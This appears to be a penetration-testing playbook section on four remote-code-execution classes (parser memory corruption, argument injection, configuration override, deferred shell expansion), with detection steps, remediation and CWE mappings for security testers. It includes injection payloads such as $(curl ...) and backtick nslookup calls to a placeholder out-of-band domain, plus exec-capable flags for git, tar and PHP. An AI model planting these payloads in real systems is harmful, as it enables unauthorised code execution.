# RCE Variants — Part 2 (V-06 … V-09)

Deep playbook sections for variants 6-9. Read `payloads.md` alongside these
for the shared ladders, encodings, and tool commands.

## Table of contents

- [V-06: RCE via memory corruption and garbage collection triggers](#v-06-rce-via-memory-corruption-and-garbage-collection-triggers)
- [V-07: Command injection via argument injection in Unix wrapper utilities](#v-07-command-injection-via-argument-injection-in-unix-wrapper-utilities)
- [V-08: RCE via insecure configuration loading and variable override](#v-08-rce-via-insecure-configuration-loading-and-variable-override)
- [V-09: Blind RCE via system environment variable injections and shell expansion](#v-09-blind-rce-via-system-environment-variable-injections-and-shell-expansion)

## V-06: RCE via memory corruption and garbage collection vulnerability triggers

**Mechanism:** Malformed input reaches a native parser (image/font/archive/
video codecs, XML/JSON-C parsers, compression libs) or a runtime's GC/
object machinery, triggering memory-safety bugs — buffer overflow, UAF,
double-free — or runtime-specific logic bugs. Controlled corruption is the
classic path to native code execution; uncontrolled corruption is at minimum
a crash/DoS. The violated assumption: "parsers treat files as data, never as
control flow".

**Preconditions:**
- Native parser in the request path (ImageMagick/GD, Ghostscript, libxml,
  zlib, harfbuzz/freetype, ffmpeg), attacker controls the file/field
- Vulnerable library version (identified via fingerprint/leak) with a
  known CVE or reproducible crash
- Enough parse depth allowed (size/type gates, sandboxed workers)

**Detect:**
1. Version fingerprint first: error strings naming the lib
   (`libpng error:`, `GIFLIB`, `Imagick X.Y`), `X-Powered-By`, EXIF writer
   tags, `Content-Type` sniffing paths, leaked dependencies (chain
   `info-disclosure-testing` for sourcemaps/package manifests).
2. Map CVE → payload: match the identified version against advisory
   databases (ImageTragick-class policy escapes, Ghostscript `-dSAFER`
   bypasses, font-parsing CVEs, decoder UAFs). Cite the CVE — an ID'd vuln
   plus reachability beats an unattributed crash.
3. Fuzz-lite with mutated files in **lab/staging** only: vary dimensions,
   chunk lengths, nesting, truncation; watch for worker restarts, segfault
   500s, latency cliffs. Never fuzz-loop production — that crosses into
   destructive territory.
4. GC-specific angles: deserialization GC pressure, refcount/refcycle bombs,
   parser recursion bombs — treat strictly as DoS unless a documented
   memory-corruption chain exists; report the crash class honestly.
5. Production line: prove *triggerability* only where explicitly permitted
   (a single reproducible crash on an in-scope staging box = valid DoS
   finding); on prod, stick to version+reachability evidence.

**Proof of concept:**
```
POST /api/image HTTP/1.1
Content-Type: multipart/form-data; boundary=<B>

# file=@<PLACEHOLDER_MALFORMED_FILE>    # crafted against CVE-<ID>, lab-verified
```

**Confirm:** Two signals — the crash/malformed behavior reproduces on demand
with the same input in a lab clone, **and** the vulnerable version is
positively identified (fingerprint match to the CVE). RCE claims require a
documented/working exploit chain in the lab, never a speculative "maybe
overflow" write-up.

**False positives:** Random 500s from timeouts (reproducibility filter —
send the same file twice). OOM from simply-large legitimate files (DoS by
volume ≠ memory corruption). Sandbox denials and quota errors looking like
crashes. Different worker nodes producing inconsistent behavior (pin the
node/test container before claiming).

**Impact:** Proven-in-lab: native RCE as the parser process (Critical, cite
CVE + chain evidence). Version-match-only: "vulnerable component reachable
from `<feature>`; exploitability likely per CVE-<ID>" — honest High-lead
framing. Crash: DoS of the parse worker. State which tier you achieved.

**Remediation:** Patch/upgrade the native lib, strip metadata via
re-encoding, run parsers under seccomp/nsjail in a throwaway container with
file/time/memory limits.

**CWE / OWASP:** CWE-119/CWE-122/CWE-416 (memory safety); OWASP A06:2021
Vulnerable and Outdated Components; WSTG — Testing for Buffer Overflow.

## V-07: Command injection via argument injection in Unix wrapper utilities

**Mechanism:** The app passes user input as a separate **argv element** to a
fixed binary (`git`, `tar`, `convert`, `ffmpeg`, `curl`, `openssl`,
`pdftotext`, `find`) with no shell involved. Shell metacharacters do
nothing — but flag injection does: a leading `-` becomes a *option* that
changes the binary's behavior (`--output`, `-o <path>`, `--upload-file`,
`--upload-pack=`, `--checkpoint-action=exec`) yielding arbitrary file
read/write, SSRF, or RCE. The tell: no `--` separator before user args.

**Preconditions:**
- Input becomes a distinct argv entry (subprocess with arg list — NOT shell)
- Binary has dangerous flags AND the app doesn't reject values starting with `-`
- No `--` end-of-options marker before user-controlled args (the missing
  separator is the whole bug)

**Detect:**
1. Identify wrapper binaries: error/version strings naming the tool,
   features like "convert image", "fetch git URL", "compress archive",
   `ps`-leak notes, docs pages.
2. Safe observable flag-flip: inject a benign supported flag whose effect
   shows in the response — `--help`-style outputs, unit/format flags
   (`--output-format=json` → response becomes JSON, `--width=1` → resized
   dimensions, `-v` → verbose/version banner). A *format change caused by
   your dash-value* is argument-injection proof with zero damage.
3. Per-binary dangerous flags (lab depth; cite as potential in prod):
   `git` `-c core.sshCommand=`/`--upload-pack=` (RCE), `tar`
   `--checkpoint-action=exec=` (RCE), `curl` URL-position `file://`,
   `find -exec`, `ffmpeg` `concat:` (file read), `imagemagick` `msl:`/
   `https:` delegates (SSRF/file read), `openssl` `-out <path>` (file write).
4. Evasion notes: try both `--opt value` and `--opt=value`; long vs short
   (`--output`/`-o`); unicode dashes (U+2013/U+2015) rarely pass validation
   but cost one attempt; URL-encoding the dash if a pre-filter strips `-`.
5. Distinguish from V-01: if metachar payloads also work, a wrapper *script*
   re-invokes a shell — you have both variants; report the shell one first.

**Proof of concept:**
```
GET /api/convert?file=<PLACEHOLDER_FILE>&opts=<PLACEHOLDER_OPT> HTTP/1.1

benign flip:  opts=--output-format=json          → response format changes
read (lab):   opts=--output /tmp/marker          → path-controlled output
per binary:   git: -c core.sshCommand=<CMD>      → RCE — LAB ONLY
```

**Confirm:** A benign flag's observable effect traceable to your dash-value
(format/size/banner change), repeatable, **plus** one read-only effect where
the tool supports it safely (e.g., `file://`-class read of `/etc/hostname`).
Dangerous-flag chains: prove only in lab containers, describe in prod.

**False positives:** Input echoed in output or visible in `ps` (that's info
disclosure, not injection). Shell-style metachar payloads "working" because
a wrapper shell exists (V-01). WAF/validator rejecting `-`-prefixed values —
a block page is not evidence of anything working. Verbose flags the app
enables for everyone regardless of input.

**Impact:** Arbitrary file read/write via output-path flags, SSRF via
protocol flags, and RCE on binaries with exec-flavored options — report the
specific binary + flag + reachable filesystem scope; severity follows
whether the primitive was proven or cited.

**Remediation:** Insert `--` before user args, allowlist each param's value
grammar (charset, not just shape), invoke binaries with fixed arg arrays at
least privilege, and disable dangerous features at build/config time
(ImageMagick policy, git protocol restrictions).

**CWE / OWASP:** CWE-88 (Argument Injection) with CWE-77 where shell is
involved; OWASP A03:2021 Injection.

## V-08: RCE via insecure configuration loading and variable override

**Mechanism:** The application or framework loads configuration from an
attacker-influenced source — uploadable config files, query-string/header
overrides (`auto_prepend_file`, `PHP_VALUE` via misrouted FastCGI params,
Spring `spring.config.import`/env overrides, `X-Forwarded-*`→settings
mappings), YAML/INI deserialization into settings — letting the attacker
flip security-relevant switches: enable debug, point template paths,
prepend a file, load a remote classpath, disable auth. The violated
assumption: "configuration is authored only by operators".

**Preconditions:**
- A controllable config surface: writable config dir, upload landing in
  config path, framework debug/env endpoint (Spring Actuator `/env`+
  `/refresh`), FastCGI `PHP_VALUE`/`PHP_ADMIN_VALUE` pass-through, query/
  header-driven settings, YAML config ingestion
- The setting you need is overridable (per-dir/per-request scope, not locked)

**Detect:**
1. Enumerate config surfaces: framework debug toggles (`?debug=true`,
   `X-Debug: 1`, Django `DEBUG`-adjacent headers), Actuator `/env`,
   `/configprops`, PHP `auto_prepend_file` params, `.env`/`config.php`
   uploads, mass-assignment onto config objects in JSON bodies.
2. FastCGI/`PHP_VALUE` test: set a *benign* observable value first —
   `PHP_VALUE=display_errors=1` then trigger an error; visible stack trace
   appearing where none did = override works (read-only-class proof).
   Prepend-file RCE (`auto_prepend_file=`) is the escalation — lab depth.
3. YAML/INI upload: land `debug: true` or a custom error-template path;
   observe the security-state change (stack traces on, custom page rendering
   your marker file).
4. Header→env/config mappings: `X-Forwarded-Prefix` (Spring app routing),
   `X-Original-URL`/`X-Rewrite-URL` (IIS/nginx rewrites — often auth bypass,
   note for `bac-idor-testing`), `Host`-driven absolute URL config.
5. Recon chain: leaked `.env`/`config.bak` via `info-disclosure-testing`
   tells you *which* settings exist and their names — use that inventory.

**Proof of concept:**
```
GET /page?debug=<PLACEHOLDER_VALUE> HTTP/1.1          # debug=true → stack trace appears
POST /upload config file: {debug: true, template: "<MARKER_PATH>"}   # behavior change
PHP-FPM: PHP_VALUE=display_errors=1                   # error visibility flip
```

**Confirm:** A **security-relevant** setting demonstrably changed by your
input — debug enabled where it wasn't, prepend executed rendering your
marker, template path overridden to your file — observed twice (before/after
diff on the same endpoint). Cosmetic config echoes don't count.

**False positives:** Debug already on for everyone (misconfiguration finding,
not injection — report the class correctly). Feature flags that are
cosmetic. Framework dev-mode toggles that require restart (your input did
nothing). WAF reflecting your param name. Actuator `/env` readable but
POST rejected (info disclosure only — route with `info-disclosure-testing`).

**Impact:** The escalation ladder: prepend-file/remote-classpath → RCE
(PHP `auto_prepend_file` from attacker URL, Spring property-source
injection), template-path override → file read/SSTI (V-05), debug-enabled →
internal exposure. State which rung you reached; don't claim prepend-RCE
without the benign proof.

**Remediation:** Load configuration only from trusted stores (files, secret
managers) with no request-time override; disable `PHP_VALUE` pass-through
(use `php_admin_value` locks in FPM pools), protect Actuator write
endpoints, and reject config-shaped query/header inputs by design.

**CWE / OWASP:** CWE-15 (External Control of System or Configuration
Setting); OWASP A05:2021 Security Misconfiguration (A03 where code
execution results).

## V-09: Blind RCE via system environment variable injections and shell expansion

**Mechanism:** Attacker input lands in environment variables or strings that
a *later* process expands through the shell — cron jobs, deploy scripts,
wrapper loops, `PATH`/`IFS`/`LD_*` manipulation, and expansion tricks
(`$(...)`/backticks inside unquoted expansions, globbing of crafted
filenames). Execution is deferred and blind: you plant the poison now; the
shell consumes it minutes or days later during a scheduled run — so no
in-band signal ever appears in the HTTP response.

**Preconditions:**
- Input stored then consumed by a shell-context process (jobs, exporters,
  watchers), or filenames created by upload that scripts later iterate
- Env override possible: HTTP headers mapped to env (CGI-era `HTTP_*`),
  config headers, job-param fields, `SetEnvIf` misconfig, container ENV
  from CI-controllable inputs
- The consuming script uses unquoted expansion (the classic sin)

**Detect:**
1. Map env/deferred surfaces: CGI-style header→env apps, features whose
   fields become job parameters ("schedule this", "export with name"),
   upload filenames later processed by shell loops, `Host`/`X-Forwarded-*`
   consumed by scripts (e.g., backup/cron scripts using `$HOST`).
2. Filename expansion probe (safe): upload a file literally named
   `` `nslookup <OOB_DOMAIN>.<TOKEN>`.jpg `` or
   `$(nslookup <OOB_DOMAIN>.<TOKEN>).png`. If a background job processes
   uploads via unquoted shell, the collaborator gets a hit — delayed by the
   job cadence, so watch for minutes, not seconds.
3. Stored-value deferred exec: set a job param to
   `$(curl http://<OOB_DOMAIN>/env-<TOKEN>)`, then trigger the consuming
   feature (manual "run now" button if present, else wait for schedule).
   Unique token per test — delayed hits arrive long after you forgot which
   payload was live.
4. Timing correlation is the in-band channel: record when you planted the
   poison and when the job normally runs (ask the program about schedules
   during triage if allowed); hit-time clustering on the schedule + a second
   plant-and-trigger cycle = two signals.
5. Escalation flags for the report (lab depth, never execute in prod):
   `PATH` shadowing (upload `./id` ahead of real `id`), `IFS` widening,
   `LD_PRELOAD` on setuid-ish paths, Windows `%COMSPEC%`/`%PATH%` expansion
   in scheduled tasks — describe the capability, don't weaponize.

**Proof of concept:**
```
POST /api/upload ...; filename="<PLACEHOLDER_FILENAME>"
   filename = `nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN>`.png

POST /api/jobs  {"name": "report-$(nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN>)"}
   → observe collaborator hit at <SCHEDULED_TIME>, repeat once
```

**Confirm:** Collaborator hit whose **timing correlates with job execution**
(not your request) with the token matching your planted value, **plus** a
reproducible second plant-and-trigger cycle. The blind/delayed nature is
why time-correlated double-signals matter most in this variant.

**False positives:** Your own earlier payloads firing later — unique tokens
per plant fix this. Email security scanners expanding and fetching URLs
stored in fields (hit UA/ASN = scanner, not the app's shell). Email-template
rendering of `${...}` (that's V-05 SSTI, not shell expansion). CMS
lazy-processing that only URL-decodes the filename (decode ≠ execution —
the collaborator hit is what separates them).

**Impact:** Deferred RCE as the job/cron user — frequently a higher
privilege than the web user (root in containers, deploy keys in CI boxes).
Phrase as "stored payload executed by scheduled job `<name>` as `<user>`,
OOB confirmed at `<timestamp>`". Explicitly note in the report that no
persistence was established and none is required to demonstrate impact
(guardrail).

**Remediation:** Never feed stored user data to shells — rewrite jobs with
argv arrays / language-native APIs, sanitize and rename filenames at upload,
quote every expansion in existing scripts, and minimize control flow
derived from environment or headers.

**CWE / OWASP:** CWE-78 (OS Command Injection, deferred) with CWE-454
(External Initialization of Trusted Variables); OWASP A03:2021 Injection.
